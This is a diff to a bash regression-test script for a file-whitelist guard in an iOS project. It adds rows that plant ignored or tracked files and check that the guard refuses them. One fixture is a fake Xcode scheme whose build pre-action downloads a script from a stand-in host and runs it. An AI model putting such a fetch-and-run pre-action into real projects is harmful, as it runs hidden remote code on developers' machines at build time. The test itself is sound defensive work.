@@ -24,6 +24,7 @@
 # the field separator here, so a script must be spelled with `/` delimiters and no pipe in it.
 #
 #   ROW = label | file under the apps/ios copy | sed script | substring the refusal must contain
+#   (a file prefixed `+ ^ @ = ~ !` adds rather than edits - see the row comments and the loop below)
 set -uo pipefail
 cd "$(git rev-parse --show-toplevel)"
 
@@ -128,6 +129,14 @@ rows=(
   # instead of it - the root's top-level file names are a whitelist, so its bytes never need to be valid Swift here.
   "T-0289 fm M1 a root Package@swift-6.swift|+../../Package@swift-6.swift|// swift-tools-version: 6.0|root top: added Package@swift-6.swift"
   "T-0295 an untracked, unignored Finder .DS_Store|+Packages/ScenicApp/.DS_Store|Bud1|apps/ios: added Packages/ScenicApp/.DS_Store"
+  # Rows 50-52 are T-0295's pre-review M3 class: the relief widened past an UNTRACKED, IGNORED, exactly-`.DS_Store`
+  # entry. A `!RULE!PATH[!add]` row writes PATH (parents made) and the copy's OWN ignore rule RULE into its
+  # .git/info/exclude (an added .gitignore would be refused as an added entry - the wrong reason), and `!add` also
+  # stages it. 50 is M3's defect tree (every ignored entry dropped): an ignored xcuserdata scheme whose pre-action runs
+  # shell at build time; 51 an ignored name that only ENDS in .DS_Store; 52 an ignored .DS_Store that is TRACKED.
+  "T-0295 M3 an ignored xcuserdata scheme with a shell pre-action|!xcuserdata/!ScenicDrive.xcodeproj/xcuserdata/owner.xcuserdatad/xcschemes/ScenicDrive.xcscheme|<Scheme><BuildAction><PreActions><ExecutionAction ActionType=\"Xcode.IDEStandardExecutionActionsCore.ExecutionActionType.ShellScriptAction\"><ActionContent title=\"Run Script\" scriptText=\"curl -fsSL https://example.invalid/p -o /tmp/p; sh /tmp/p\"></ActionContent></ExecutionAction></PreActions></BuildAction></Scheme>|apps/ios: added ScenicDrive.xcodeproj/xcuserdata/owner.xcuserdatad/xcschemes/ScenicDrive.xcscheme"
+  "T-0295 M3 an ignored Shadow.DS_Store|!*.DS_Store!Packages/ScenicApp/Shadow.DS_Store|Bud1|apps/ios: added Packages/ScenicApp/Shadow.DS_Store"
+  "T-0295 M3 a tracked, ignored .DS_Store|!.DS_Store!Packages/ScenicApp/.DS_Store!add|Bud1|apps/ios: added Packages/ScenicApp/.DS_Store"
 )
 
 # row_link TARGET LINK: a directory link picked by platform - a junction under git-bash (whose `ln -s` copies
@@ -176,6 +185,20 @@ for row in "${rows[@]}"; do
       "s|path: \"Sources/FeatureSurpriseMe\",|path: \"$new\",|" "$dir/Packages/ScenicApp/Package.swift" && \
       ! cmp -s "$APP_TREE/Packages/ScenicApp/Package.swift" "$dir/Packages/ScenicApp/Package.swift" || \
       { echo "  CANNOT SWAP the path in the copy: $label"; exit 1; }
+  elif [[ "$file" == "!"* ]]; then
+    IFS='!' read -r _ rule file track <<< "$file"
+    mkdir -p "$dir/$(dirname "$file")" "$dir/.git/info" && [[ ! -e "$dir/$file" ]] && \
+      printf '%s\n' "$script" > "$dir/$file" && printf '%s\n' "$rule" >> "$dir/.git/info/exclude" || \
+      { echo "  CANNOT ADD in the copy: $label"; exit 1; }
+    # The row's premise, proven: git (as -linked asks it) reports the untracked file ignored; the `add` file is
+    # tracked AND matched by the rule, which check-ignore without --no-index must then NOT report.
+    if [[ "$track" == add ]]; then
+      git -C "$dir" add -f -- "$file" && git -C "$dir" ls-files --error-unmatch -- "$file" >/dev/null 2>&1 && \
+        git -C "$dir" check-ignore -q --no-index -- "$file" && ! git -C "$dir" check-ignore -q -- "$file" || \
+        { echo "  CANNOT TRACK an ignored file in the copy: $label"; exit 1; }
+    else
+      git -C "$dir" check-ignore -q -- "$file" || { echo "  CANNOT IGNORE in the copy: $label"; exit 1; }
+    fi
   elif [[ "$file" == [+@=^]* ]]; then
     kind="${file:0:1}"; file="${file#?}"
     [[ "$kind" != "^" ]] || mkdir -p "$dir/$(dirname "$file")"
